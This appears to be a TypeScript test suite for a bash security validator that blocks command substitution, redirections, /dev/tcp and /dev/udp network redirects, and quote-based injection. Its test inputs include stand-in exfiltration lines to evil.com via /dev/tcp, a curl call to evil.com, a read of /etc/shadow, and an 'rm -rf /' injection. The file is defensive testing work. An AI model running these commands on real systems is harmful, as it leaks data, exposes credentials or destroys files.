/**
 * Tests for the 5 new bash security validators added for feature parity:
 * - validateShellQuoteBug (CHECK_ID 33)
 * - validateCommandSubstitution (CHECK_ID 31)
 * - validateRedirections (CHECK_ID 32)
 * - validateBackslashEscapedWhitespace (CHECK_ID 34)
 * - validateMalformedTokenInjection (CHECK_ID 35)
 */

import { describe, it } from 'node:test';
import * as assert from 'node:assert/strict';
import {
  validateShellQuoteBug,
  validateCommandSubstitution,
  validateRedirections,
  validateBackslashEscapedWhitespace,
  validateMalformedTokenInjection,
  validateBashSecurity,
} from '../src/tools/bash-security';

// ---------------------------------------------------------------------------
// validateShellQuoteBug — blocks '\'' pattern (shell-quote library misparse)
// ---------------------------------------------------------------------------

describe('validateShellQuoteBug', () => {
  it('blocks the backslash-single-quote pattern', () => {
    const result = validateShellQuoteBug("echo '\\''");
    assert.equal(result.safe, false);
    assert.ok(result.message!.includes('shell-quote'));
  });

  it('passes normal single-quoted strings', () => {
    assert.equal(validateShellQuoteBug("echo 'hello world'").safe, true);
  });

  it('passes normal double-quoted strings', () => {
    assert.equal(validateShellQuoteBug('echo "hello"').safe, true);
  });

  it('passes backslashes in double quotes', () => {
    assert.equal(validateShellQuoteBug('echo "path\\to\\file"').safe, true);
  });
});

// ---------------------------------------------------------------------------
// validateCommandSubstitution — blocks $(), ${}, $[], ~[], =(, etc.
// ---------------------------------------------------------------------------

describe('validateCommandSubstitution', () => {
  it('blocks $() command substitution', () => {
    const result = validateCommandSubstitution('echo $(whoami)', { fullyUnquoted: 'echo $(whoami)' });
    assert.equal(result.safe, false);
  });

  it('blocks ${} parameter expansion', () => {
    const result = validateCommandSubstitution('echo ${PATH}', { fullyUnquoted: 'echo ${PATH}' });
    assert.equal(result.safe, false);
  });

  it('blocks $[] arithmetic', () => {
    const result = validateCommandSubstitution('echo $[1+1]', { fullyUnquoted: 'echo $[1+1]' });
    assert.equal(result.safe, false);
  });

  it('passes simple echo commands', () => {
    const result = validateCommandSubstitution('echo hello', { fullyUnquoted: 'echo hello' });
    assert.equal(result.safe, true);
  });

  it('passes commands with bare $VAR (not substitution pattern)', () => {
    const result = validateCommandSubstitution('echo $HOME', { fullyUnquoted: 'echo $HOME' });
    assert.equal(result.safe, true);
  });
});

// ---------------------------------------------------------------------------
// validateRedirections — blocks unquoted redirect operators
// ---------------------------------------------------------------------------

describe('validateRedirections', () => {
  it('blocks unquoted <> redirect operator', () => {
    const result = validateRedirections('cmd <> /dev/tcp/evil.com/80', { fullyUnquoted: 'cmd <> /dev/tcp/evil.com/80' });
    assert.equal(result.safe, false);
  });

  it('blocks unquoted > to arbitrary file', () => {
    const result = validateRedirections('echo hello > file.txt', { fullyUnquoted: 'echo hello > file.txt' });
    assert.equal(result.safe, false);
  });

  it('passes commands without redirections', () => {
    const result = validateRedirections('echo hello', { fullyUnquoted: 'echo hello' });
    assert.equal(result.safe, true);
  });

  it('passes safe redirections like > /dev/null', () => {
    const result = validateRedirections('cmd > /dev/null', { fullyUnquoted: 'cmd > /dev/null' });
    assert.equal(result.safe, true);
  });
});

// ---------------------------------------------------------------------------
// validateBackslashEscapedWhitespace — blocks \<space> pattern
// ---------------------------------------------------------------------------

describe('validateBackslashEscapedWhitespace', () => {
  it('blocks backslash-space pattern', () => {
    const result = validateBackslashEscapedWhitespace('cmd\\ arg', { fullyUnquoted: 'cmd\\ arg' });
    assert.equal(result.safe, false);
  });

  it('passes normal commands', () => {
    const result = validateBackslashEscapedWhitespace('echo hello', { fullyUnquoted: 'echo hello' });
    assert.equal(result.safe, true);
  });
});

// ---------------------------------------------------------------------------
// validateMalformedTokenInjection — blocks malformed quoting + separators
// ---------------------------------------------------------------------------

describe('validateMalformedTokenInjection', () => {
  it('blocks unmatched quote followed by separator', () => {
    const result = validateMalformedTokenInjection("echo test' ;rm -rf /");
    assert.equal(result.safe, false);
  });

  it('passes well-formed commands', () => {
    const result = validateMalformedTokenInjection('echo "hello world"');
    assert.equal(result.safe, true);
  });

  it('passes single-line commands without separators', () => {
    const result = validateMalformedTokenInjection('ls -la /tmp');
    assert.equal(result.safe, true);
  });

  it('passes properly matched quotes with separators', () => {
    const result = validateMalformedTokenInjection("echo 'test' && echo 'done'");
    assert.equal(result.safe, true);
  });
});

// ---------------------------------------------------------------------------
// Integration: validateBashSecurity with new validators
// ---------------------------------------------------------------------------

describe('validateBashSecurity — new validators integration', () => {
  it('catches shell-quote bug pattern', () => {
    const result = validateBashSecurity("echo '\\''injection");
    assert.equal(result.safe, false);
  });

  it('still passes normal piped commands', () => {
    assert.equal(validateBashSecurity('cat file.txt | grep pattern').safe, true);
    assert.equal(validateBashSecurity('ls -la | head -5').safe, true);
  });

  it('still passes normal commands', () => {
    assert.equal(validateBashSecurity('echo hello').safe, true);
    assert.equal(validateBashSecurity('git status').safe, true);
    assert.equal(validateBashSecurity('npm test').safe, true);
  });
});

// ---------------------------------------------------------------------------
// Safe heredoc early-allow (stripSafeHeredocSubstitutions)
// ---------------------------------------------------------------------------

describe('stripSafeHeredocSubstitutions', () => {
  const { stripSafeHeredocSubstitutions } = require('../src/tools/bash-security') as typeof import('../src/tools/bash-security');

  it('returns null for commands without heredoc substitutions', () => {
    assert.equal(stripSafeHeredocSubstitutions('echo hello'), null);
    assert.equal(stripSafeHeredocSubstitutions('git commit -m "msg"'), null);
  });

  it('strips safe single-quoted heredoc substitution', () => {
    const cmd = "git commit -m \"$(cat <<'EOF'\ncommit message\nEOF\n)\"";
    const result = stripSafeHeredocSubstitutions(cmd);
    assert.ok(result !== null);
    assert.ok(!result!.includes('EOF'));
    assert.ok(!result!.includes('commit message'));
  });

  it('strips safe backslash-escaped heredoc substitution', () => {
    const cmd = "git commit -m \"$(cat <<\\EOF\nmessage\nEOF\n)\"";
    const result = stripSafeHeredocSubstitutions(cmd);
    assert.ok(result !== null);
    assert.ok(!result!.includes('message'));
  });

  it('handles <<- (tab-stripping) heredocs', () => {
    const cmd = "git commit -m \"$(cat <<-'END'\n\t\tmessage\n\t\tEND\n)\"";
    const result = stripSafeHeredocSubstitutions(cmd);
    assert.ok(result !== null);
  });

  it('returns null for escaped $( before heredoc', () => {
    const cmd = "echo \\$(cat <<'EOF'\ntest\nEOF\n)";
    assert.equal(stripSafeHeredocSubstitutions(cmd), null);
  });

  it('returns null when delimiter is not found', () => {
    const cmd = "$(cat <<'EOF'\nno closing delimiter here";
    assert.equal(stripSafeHeredocSubstitutions(cmd), null);
  });
});

// ---------------------------------------------------------------------------
// Enhanced validateCommentQuoteDesync (quote-state tracking)
// ---------------------------------------------------------------------------

describe('validateCommentQuoteDesync — enhanced', () => {
  const { validateCommentQuoteDesync, CHECK_IDS } = require('../src/tools/bash-security') as typeof import('../src/tools/bash-security');

  it('passes commands without comments', () => {
    assert.equal(validateCommentQuoteDesync('echo hello').safe, true);
  });

  it('passes comments without quotes', () => {
    assert.equal(validateCommentQuoteDesync('echo hello # this is fine').safe, true);
  });

  it('blocks comments with single quotes', () => {
    const result = validateCommentQuoteDesync("echo hello # it's dangerous");
    assert.equal(result.safe, false);
    assert.equal(result.checkId, CHECK_IDS.COMMENT_QUOTE_DESYNC);
  });

  it('blocks comments with double quotes', () => {
    const result = validateCommentQuoteDesync('echo hello # say "hi"');
    assert.equal(result.safe, false);
  });

  it('ignores hash inside single quotes', () => {
    assert.equal(validateCommentQuoteDesync("echo 'color=#fff'").safe, true);
  });

  it('ignores hash inside double quotes', () => {
    assert.equal(validateCommentQuoteDesync('echo "color=#fff"').safe, true);
  });

  it('detects desync across multi-line commands', () => {
    const cmd = "echo first\necho second # it's a trap\necho third";
    const result = validateCommentQuoteDesync(cmd);
    assert.equal(result.safe, false);
  });

  it('passes hash after backslash-escaped quote', () => {
    assert.equal(validateCommentQuoteDesync("echo \\'# safe").safe, true);
  });
});

// ---------------------------------------------------------------------------
// Enhanced validateQuotedNewline (newline inside quotes + # line)
// ---------------------------------------------------------------------------

describe('validateQuotedNewline — enhanced', () => {
  const { validateQuotedNewline, CHECK_IDS } = require('../src/tools/bash-security') as typeof import('../src/tools/bash-security');

  it('passes commands without newlines', () => {
    assert.equal(validateQuotedNewline('echo hello').safe, true);
  });

  it('passes commands without hash', () => {
    assert.equal(validateQuotedNewline('echo "hello\nworld"').safe, true);
  });

  it('blocks ANSI-C quoted newline', () => {
    const result = validateQuotedNewline("echo $'hello\\nworld'");
    assert.equal(result.safe, false);
    assert.equal(result.checkId, CHECK_IDS.QUOTED_NEWLINE);
  });

  it('blocks single-quoted newline followed by # line', () => {
    const cmd = "echo 'line1\n# hidden comment\nline3'";
    const result = validateQuotedNewline(cmd);
    assert.equal(result.safe, false);
  });

  it('blocks double-quoted newline followed by # line', () => {
    const cmd = 'echo "line1\n# hidden\nline3"';
    const result = validateQuotedNewline(cmd);
    assert.equal(result.safe, false);
  });

  it('passes quoted newline NOT followed by # line', () => {
    const cmd = "echo 'line1\nline2\nline3'";
    assert.equal(validateQuotedNewline(cmd).safe, true);
  });

  it('passes unquoted newline followed by # line', () => {
    const cmd = 'echo hello\n# this is a normal comment\necho bye';
    assert.equal(validateQuotedNewline(cmd).safe, true);
  });
});

// ---------------------------------------------------------------------------
// Integration: safe heredoc passes through validateBashSecurity
// ---------------------------------------------------------------------------

describe('validateBashSecurity — heredoc early-allow integration', () => {
  it('allows git commit with safe heredoc message', () => {
    const cmd = "git commit -m \"$(cat <<'EOF'\nfix: resolve issue\nEOF\n)\"";
    const result = validateBashSecurity(cmd);
    assert.equal(result.safe, true, `Expected safe but got: ${result.message}`);
  });
});

// ---------------------------------------------------------------------------
// detectZshRegexConditional
// ---------------------------------------------------------------------------

import { detectZshRegexConditional, validateDevTcpUdpRedirects } from '../src/tools/bash-security';

// ---------------------------------------------------------------------------
// validateDevTcpUdpRedirects — blocks /dev/tcp and /dev/udp network redirects
// ---------------------------------------------------------------------------

describe('validateDevTcpUdpRedirects', () => {
  it('blocks echo redirected to /dev/tcp', () => {
    const r = validateDevTcpUdpRedirects('echo hi > /dev/tcp/evil.com/80');
    assert.equal(r.safe, false);
    assert.ok(r.message!.includes('/dev/tcp'));
  });

  it('blocks cat from /dev/udp', () => {
    const r = validateDevTcpUdpRedirects('cat < /dev/udp/10.0.0.1/53');
    assert.equal(r.safe, false);
    assert.ok(r.message!.includes('/dev/udp'));
  });

  it('blocks exec with /dev/tcp bidirectional redirect', () => {
    const r = validateDevTcpUdpRedirects('exec 3<>/dev/tcp/host/443');
    assert.equal(r.safe, false);
  });

  it('blocks /dev/tcp in a compound command', () => {
    const r = validateDevTcpUdpRedirects('bash -c "cat /dev/tcp/evil.com/80"');
    assert.equal(r.safe, false);
  });

  it('blocks /dev/udp with uppercase (case-insensitive)', () => {
    const r = validateDevTcpUdpRedirects('echo > /DEV/TCP/host/80');
    assert.equal(r.safe, false);
  });

  it('allows /dev/null redirects', () => {
    assert.equal(validateDevTcpUdpRedirects('cmd > /dev/null').safe, true);
  });

  it('allows /dev/zero references', () => {
    assert.equal(validateDevTcpUdpRedirects('dd if=/dev/zero of=file').safe, true);
  });

  it('allows /dev/urandom reads', () => {
    assert.equal(validateDevTcpUdpRedirects('cat /dev/urandom | head -c 16').safe, true);
  });

  it('allows normal commands without /dev paths', () => {
    assert.equal(validateDevTcpUdpRedirects('echo hello world').safe, true);
    assert.equal(validateDevTcpUdpRedirects('git status').safe, true);
    assert.equal(validateDevTcpUdpRedirects('npm test').safe, true);
  });

  it('allows empty command', () => {
    assert.equal(validateDevTcpUdpRedirects('').safe, true);
  });
});

describe('validateDevTcpUdpRedirects — integration with validateBashSecurity', () => {
  it('blocks /dev/tcp through the full validator (interactive mode)', () => {
    const r = validateBashSecurity('echo data > /dev/tcp/evil.com/80');
    assert.equal(r.safe, false);
  });

  it('blocks /dev/tcp through the full validator (detached mode)', () => {
    const r = validateBashSecurity('echo data > /dev/tcp/evil.com/80', { detachedMode: true });
    assert.equal(r.safe, false);
  });

  it('blocks /dev/udp through the full validator (interactive mode)', () => {
    const r = validateBashSecurity('cat < /dev/udp/10.0.0.1/53');
    assert.equal(r.safe, false);
  });

  it('blocks /dev/udp through the full validator (detached mode)', () => {
    const r = validateBashSecurity('cat < /dev/udp/10.0.0.1/53', { detachedMode: true });
    assert.equal(r.safe, false);
  });
});

describe('detectZshRegexConditional', () => {
  it('blocks $(...) inside [[ =~ ]]', () => {
    const r = detectZshRegexConditional('[[ $x =~ $(cat /etc/shadow) ]]');
    assert.equal(r.blocked, true);
    assert.ok(r.reason?.includes('Command substitution'));
  });

  it('blocks backtick substitution inside [[ =~ ]]', () => {
    const r = detectZshRegexConditional('[[ $x =~ `whoami` ]]');
    assert.equal(r.blocked, true);
  });

  it('blocks nested $(...) with arguments', () => {
    const r = detectZshRegexConditional('[[ $var =~ $(curl http://evil.com) ]]');
    assert.equal(r.blocked, true);
  });

  it('allows plain regex pattern in [[ =~ ]]', () => {
    const r = detectZshRegexConditional('[[ $var =~ ^[0-9]+$ ]]');
    assert.equal(r.blocked, false);
  });

  it('allows simple == comparison', () => {
    const r = detectZshRegexConditional('[[ $var == "hello" ]]');
    assert.equal(r.blocked, false);
  });

  it('allows plain variable expansion in [[ =~ ]]', () => {
    const r = detectZshRegexConditional('[[ $x =~ ${pattern} ]]');
    assert.equal(r.blocked, false);
  });

  it('allows commands without [[ =~ ]]', () => {
    const r = detectZshRegexConditional('echo hello && grep foo bar');
    assert.equal(r.blocked, false);
  });

  it('allows empty command', () => {
    const r = detectZshRegexConditional('');
    assert.equal(r.blocked, false);
  });
});
